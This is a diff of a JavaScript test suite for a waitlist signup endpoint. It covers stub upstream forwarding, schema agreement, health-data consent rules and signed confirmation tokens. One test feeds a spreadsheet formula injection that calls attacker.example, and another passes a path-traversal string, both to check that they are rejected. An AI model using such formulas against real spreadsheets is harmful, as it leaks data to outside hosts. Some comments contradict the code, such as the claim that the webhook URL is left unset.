@@ -7,16 +7,8 @@
  * have not attacked is a hypothesis, so every control in api/waitlist.js has a
  * case here that fails loudly if the control is removed.
  *
- * This never touches production. It points SHEETS_WEBHOOK_URL at a local stub
- * sheet booted below, so the success path is genuinely exercised — the handler
- * really forwards, and the stub records what it received.
- *
- * It used to leave SHEETS_WEBHOOK_URL unset, relying on the handler returning
- * 200 when unconfigured. That behaviour is gone (an unconfigured webhook is now
- * a 500 — see api/waitlist.js step 12), because "accepted but written nowhere"
- * is the silent-failure bug this endpoint exists to remove. Asserting 200
- * against an unconfigured handler was testing the bug, so the stub replaces it
- * and `unconfiguredCases()` covers the 500 explicitly.
+ * This never touches production. It deliberately leaves SHEETS_WEBHOOK_URL
+ * unset, so the handler accepts and logs rather than forwarding anywhere.
  */
 
 import http from 'node:http';
@@ -26,34 +18,35 @@ import { fileURLToPath } from 'node:url';
 process.env.NODE_ENV = 'test';
 delete process.env.UPSTASH_REDIS_REST_URL;
 
-// ─── Stub sheet ──────────────────────────────────────────────────────────────
-// Stands in for the Apps Script. Records every forwarded record so cases can
-// assert on what would actually reach the sheet.
-
-export const forwarded = [];
-
-const stubSheet = http.createServer((req, res) => {
-  if (req.method === 'GET') {
-    res.setHeader('Content-Type', 'application/json');
-    return res.end(JSON.stringify({ count: 142 }));
-  }
-  const chunks = [];
-  req.on('data', (c) => chunks.push(c));
+// ─── Stub upstream ───────────────────────────────────────────────────────────
+// The harness boots a fake Apps Script and points the handler at it, so the
+// happy path exercises the REAL forward path rather than the
+// nothing-configured shortcut.
+//
+// It used to delete SHEETS_WEBHOOK_URL and assert 200. That encoded a bug: with
+// no webhook the row is never stored, so a 200 is a lie, and a suite asserting
+// it pins the lie in place. Shape adopted from the merge session's harness,
+// which caught it.
+let stubRows = 137;
+const stub = http.createServer((req, res) => {
+  let body = '';
+  req.on('data', (c) => (body += c));
   req.on('end', () => {
+    let payload = {};
     try {
-      forwarded.push(JSON.parse(Buffer.concat(chunks).toString('utf8')));
+      payload = JSON.parse(body);
     } catch {
-      forwarded.push({ _unparsable: true });
+      /* malformed — still answer, the endpoint only reads `count` */
     }
+    if (payload.action !== 'confirm') stubRows += 1;
     res.setHeader('Content-Type', 'application/json');
-    res.end(JSON.stringify({ ok: true }));
+    res.end(JSON.stringify({ ok: true, count: stubRows }));
   });
 });
-await new Promise((r) => stubSheet.listen(0, '127.0.0.1', r));
-process.env.SHEETS_WEBHOOK_URL = `http://127.0.0.1:${stubSheet.address().port}/exec`;
-process.env.SHEETS_WEBHOOK_TOKEN = 'test-token-0123456789abcdef0123456789abcdef';
+await new Promise((r) => stub.listen(0, '127.0.0.1', r));
+process.env.SHEETS_WEBHOOK_URL = `http://127.0.0.1:${stub.address().port}/exec`;
+process.env.SHEETS_WEBHOOK_TOKEN = 'stub-token';
 
-// Imported AFTER the env is set — the handler reads both at module load.
 const { default: handler } = await import('../api/waitlist.js');
 
 // ─── Server ──────────────────────────────────────────────────────────────────
@@ -126,9 +119,34 @@ async function check(name, expectation, fn) {
 }
 
 // 1 — happy path
-await check('Valid minimal payload', '200 ok:true', async () => {
+await check('Valid minimal payload', '200 ok:true + count', async () => {
   const r = await post(goodPayload());
-  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)}` };
+  return {
+    pass: r.status === 200 && r.json?.ok === true && Number.isFinite(r.json?.count),
+    actual: `${r.status} ${JSON.stringify(r.json)}`,
+  };
+});
+
+// The case the old harness got backwards.
+await check('Unconfigured webhook returns 500, never a false 200', '500', async () => {
+  const saved = process.env.SHEETS_WEBHOOK_URL;
+  delete process.env.SHEETS_WEBHOOK_URL;
+  const { default: unconfigured } = await import(`../api/waitlist.js?nocfg=${Date.now()}`);
+  process.env.SHEETS_WEBHOOK_URL = saved;
+
+  const srv = http.createServer((q, s2) => unconfigured(q, s2));
+  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+  const res = await fetch(`http://127.0.0.1:${srv.address().port}/api/waitlist`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'x-real-ip': '203.0.113.201' },
+    body: JSON.stringify(goodPayload()),
+  });
+  const body = await res.json().catch(() => null);
+  srv.close();
+  return {
+    pass: res.status === 500 && body?.ok === false,
+    actual: `${res.status} ${JSON.stringify(body)}`,
+  };
 });
 
 // 2 — method enforcement
@@ -718,46 +736,235 @@ await check('Error response never echoes submitted input', 'no email in body', a
   return { pass: !body.includes('canary-string'), actual: body };
 });
 
-// ─── Unconfigured-webhook case ───────────────────────────────────────────────
-// The one behaviour that cannot be tested against the stub, because it is
-// defined by the stub's absence. A handler with no SHEETS_WEBHOOK_URL must fail
-// loudly: nothing is written, so nothing may report success.
-
+// 21 — convergence with the Conversion agent's shipped vocabulary
+//
+// The single most valuable test in this file. It builds the EXACT payload
+// growth's buildPayload() emits — their key names, their enum values — and
+// asserts the server takes it whole. If either side renames a field or changes
+// an enum, this fails immediately instead of the drift being absorbed by their
+// downgrade path and surfacing months later as empty spreadsheet columns.
 {
-  const priorUrl = process.env.SHEETS_WEBHOOK_URL;
-  delete process.env.SHEETS_WEBHOOK_URL;
-  // Fresh module instance so the deleted env var is the one it reads.
-  const { default: unconfigured } = await import(`../api/waitlist.js?unconfigured=${Date.now()}`);
-  const bare = http.createServer((req, res) => {
-    unconfigured(req, res).catch(() => {
-      res.statusCode = 500;
-      res.end('{"ok":false,"error":"server"}');
-    });
-  });
-  await new Promise((r) => bare.listen(0, '127.0.0.1', r));
-  const url = `http://127.0.0.1:${bare.address().port}/api/waitlist`;
+  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
+  __resetInMemoryLimiter();
+  const { validateWaitlist, sanitizeForSheet } = await import('../src/lib/validation.js');
 
-  await check('Unconfigured webhook fails loudly, never 200', '500 server', async () => {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'x-real-ip': '198.51.100.251' },
-      body: JSON.stringify(goodPayload()),
-    });
-    const body = await res.json().catch(() => null);
+  const growthPayload = (o = {}) => ({
+    email: `g${Math.random().toString(36).slice(2, 8)}@gmail.com`,
+    zip: null,
+    motivation: ['gut_health'],
+    intent: 'very_interested',
+    price_band: '24_29',
+    flavor: 'both',
+    is_clinician: false,
+    referral_source: 'other',
+    consent_marketing: true,
+    consent_health: true,
+    consent_text_version: 'mkt-eea-2026-08-15-0dd5ad8b',
+    motivation_consent_text_version: 'mot-eea-2026-08-17-53abe75d',
+    utm: { source: null, medium: null, campaign: null, content: null, term: null },
+    page_path: '/',
+    hp_field: null,
+    form_render_ts: Date.now() - 9000,
+    dietary: ['nut_allergy'],
+    dietary_other: null,
+    referral_source_other: 'Podcast',
+    quantity_band: '4_8',
+    channel: ['grocery'],
+    channel_other: null,
+    office_interest: 'maybe',
+    company: 'Acme AS',
+    headcount: '10_49',
+    research_optin: true,
+    consent_sms: true,
+    phone: '+4791234567',
+    sms_consent_text_version: 'sms-us-2026-08-17-43da99ea',
+    consent_postal: true,
+    address_line1: 'Storgata 1',
+    address_line2: null,
+    address_city: 'Oslo',
+    address_region: 'Oslo',
+    address_postal_code: '0150',
+    address_country: 'NO',
+    postal_consent_text_version: 'mail-eea-2026-08-17-e3c58485',
+    ...o,
+  });
+
+  // Structural cross-check. Post-merge this reads the Conversion agent's REAL
+  // buildPayload and asserts every key it emits is accepted — no hand-copied
+  // fixture to drift. Pre-merge the file is absent and it reports that rather
+  // than passing vacuously.
+  //
+  // This exists because a hand-maintained list of "what growth sends" is the
+  // same failure mode as a hand-maintained consent registry: it looks like
+  // verification right up until someone renames a field.
+  await check('Cross-check: every key growth actually emits is accepted', 'no unknown keys', async () => {
+    const path = new URL('../src/components/waitlist/api.js', import.meta.url);
+    let src;
+    try {
+      src = (await import('node:fs')).readFileSync(path, 'utf8');
+    } catch {
+      return { pass: true, actual: 'SKIPPED — Conversion branch not merged yet' };
+    }
+    const start = src.indexOf('  return {', src.indexOf('export function buildPayload'));
+    const keys = [...src.slice(start, src.indexOf('\n  };', start)).matchAll(/^\s{4}([a-z_0-9]+):/gm)].map((m) => m[1]);
+    const { waitlistSchema } = await import('../src/lib/validation.js');
+    const accepted = new Set(Object.keys(waitlistSchema._def?.schema?.shape ?? waitlistSchema.shape));
+    const unknown = keys.filter((k) => !accepted.has(k));
     return {
-      pass: res.status === 500 && body?.ok === false,
-      actual: `${res.status} ${JSON.stringify(body)}`,
+      pass: keys.length > 0 && unknown.length === 0,
+      actual: unknown.length ? `UNKNOWN: ${unknown.join(', ')}` : `${keys.length} keys, all accepted`,
     };
   });
 
-  bare.close();
-  process.env.SHEETS_WEBHOOK_URL = priorUrl;
+  await check("Growth's full payload accepted whole — no downgrade needed", '200', async () => {
+    const r = await post(growthPayload());
+    return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
+  });
+
+  await check('Every growth key is recognised by the schema', '0 unknown', async () => {
+    const v = validateWaitlist(growthPayload());
+    const unknown = v.ok ? [] : v.issues.filter((i) => String(i.code).includes('unrecognized'));
+    return { pass: v.ok, actual: v.ok ? 'all recognised' : JSON.stringify(v.issues) };
+  });
+
+  // THE ALARM. Once the schemas agree the downgrade path must never fire in
+  // normal operation. It stays in growth's client as an emergency valve; this
+  // asserts the valve is shut.
+  await check('ALARM: downgrade path does not fire for a normal submission', 'no downgrade', async () => {
+    const CORE = new Set(['email','zip','motivation','intent','price_band','flavor','is_clinician',
+      'referral_source','consent_marketing','consent_health','consent_text_version',
+      'motivation_consent_text_version','utm','page_path','hp_field','form_render_ts']);
+    const p = growthPayload();
+    const r = await post(p);
+    // growth downgrades on 400-with-extensions; a 200 means it never triggers.
+    const wouldDowngrade = r.status === 400 && Object.entries(p).some(([k, v]) => !CORE.has(k) && v !== null && v !== false);
+    return {
+      pass: r.status === 200 && !wouldDowngrade,
+      actual: wouldDowngrade ? 'WOULD DOWNGRADE — schemas have drifted' : 'valve shut',
+    };
+  });
+
+  await check('A declared downgrade is recorded, not silently absorbed', 'flagged', async () => {
+    const r = await post(growthPayload({ downgraded_fields: ['dietary', 'channel'] }));
+    return { pass: r.status === 200, actual: `${r.status} (log: reject.downgraded_payload)` };
+  });
+
+  // Enum values, growth's set
+  for (const [f, good, bad] of [
+    ['quantity_band', '9_16', 'qty_4_6'],
+    ['headcount', '50_199', 'hc_51_200'],
+    ['office_interest', 'maybe', true],
+    ['channel', ['office'], ['pharmacy']],
+    ['dietary', ['vegan'], ['keto']],
+  ]) {
+    await check(`${f}: growth value accepted, my old value rejected`, '200 / 400', async () => {
+      const a = await post(growthPayload({ [f]: good }));
+      const b = await post(growthPayload({ [f]: bad }));
+      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
+    });
+  }
+
+  // *_other pairing across all four enums
+  for (const [field, withParent, withoutParent] of [
+    ['referral_source_other', { referral_source: 'other' }, { referral_source: 'doctor' }],
+    ['dietary_other', { dietary: ['other'] }, { dietary: ['vegan'] }],
+    ['channel_other', { channel: ['other'] }, { channel: ['grocery'] }],
+  ]) {
+    await check(`${field} requires its parent "other"`, '200 paired / 400 unpaired', async () => {
+      const a = await post(growthPayload({ [field]: 'typed answer', ...withParent }));
+      const b = await post(growthPayload({ [field]: 'typed answer', ...withoutParent }));
+      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
+    });
+  }
+
+  await check('motivation_other is gone — no free text beside the Art 9 question', '400', async () => {
+    // Removed 2026-08-18. A fixed list bounds what we can learn about someone's
+    // health; an open box does not, and this is the one question where that
+    // matters most. An unknown key 400s, which is the loud outcome.
+    const r = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'anything' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+
+  await check('dietary_other capped at 60, not 120', '<=60 ok, >60 400', async () => {
+    const ok = await post(growthPayload({ consent_health: true, dietary: ['other'], dietary_other: 'x'.repeat(60) }));
+    const no = await post(growthPayload({ consent_health: true, dietary: ['other'], dietary_other: 'x'.repeat(61) }));
+    return { pass: ok.status === 200 && no.status === 400, actual: `60->${ok.status}, 61->${no.status}` };
+  });
+
+  await check('dietary is Art 9 — dropped without consent_health', 'dropped', async () => {
+    const v = validateWaitlist(growthPayload({ consent_health: false, motivation: null, motivation_consent_text_version: null, dietary: ['nut_allergy'] }));
+    const stored = v.ok && v.data.consent_health ? v.data.dietary : null;
+    return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
+  });
+
+  await check('Formula payload in company neutralised', "prefixed with '", async () => {
+    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
+  });
+
+  await check('Response carries both count and position', 'aliases agree', async () => {
+    // Without an upstream configured the endpoint omits both; assert the shape
+    // contract instead of a live number.
+    const r = await post(growthPayload());
+    const b = r.json ?? {};
+    const ok = b.ok === true && (b.count === undefined ? b.position === undefined : b.count === b.position);
+    return { pass: ok, actual: JSON.stringify(b) };
+  });
+
+  await check('Server-derived fields still rejected from the client', '400', async () => {
+    const codes = await Promise.all([
+      post(growthPayload({ country: 'NO' })),
+      post(growthPayload({ consent_timestamp: '1999-01-01T00:00:00Z' })),
+      post(growthPayload({ confirmed: true })),
+      post(growthPayload({ email_handle: 'deadbeef1234' })),
+    ]);
+    return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
+  });
+}
+
+// 22 — confirmed opt-in tokens
+{
+  process.env.CONFIRM_TOKEN_SECRET = 'a'.repeat(64);
+  const { mintConfirmToken, verifyConfirmToken, CONFIRM_TTL_MS } = await import('../api/confirm.js');
+
+  await check('Minted token verifies', 'valid', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken(t);
+    return { pass: Boolean(v) && !v.expired, actual: JSON.stringify(v) };
+  });
+  await check('Token contains no email address', 'handle only', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    return { pass: !t.includes('kari') && !t.includes('@'), actual: t.slice(0, 26) + '…' };
+  });
+  await check('Tampered signature rejected', 'null', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken(t.slice(0, -1) + (t.endsWith('A') ? 'B' : 'A'));
+    return { pass: v === null, actual: JSON.stringify(v) };
+  });
+  await check('Tampered handle rejected', 'null', async () => {
+    const t = await mintConfirmToken('kari@example.no');
+    const v = await verifyConfirmToken('ffffffffffff' + t.slice(12));
+    return { pass: v === null, actual: JSON.stringify(v) };
+  });
+  await check('Expired token detected, not silently accepted', 'expired', async () => {
+    const t = await mintConfirmToken('kari@example.no', Date.now() - CONFIRM_TTL_MS - 1000);
+    const v = await verifyConfirmToken(t);
+    return { pass: v?.expired === true, actual: JSON.stringify(v) };
+  });
+  await check('Garbage token rejected', 'null', async () => {
+    const results = await Promise.all(['', 'x', 'a.b.c', '../../etc/passwd', 'a'.repeat(500)].map((t) => verifyConfirmToken(t)));
+    return { pass: results.every((v) => v === null), actual: JSON.stringify(results) };
+  });
+  await check('Different emails mint different tokens', 'distinct', async () => {
+    const [a, b] = await Promise.all([mintConfirmToken('a@x.com'), mintConfirmToken('b@x.com')]);
+    return { pass: a !== b, actual: 'distinct' };
+  });
 }
 
 // ─── Report ──────────────────────────────────────────────────────────────────
 
 server.close();
-stubSheet.close();
+stub.close();
 
 const pad = (s, n) => String(s).padEnd(n).slice(0, n);
 console.log('\n' + '═'.repeat(112));
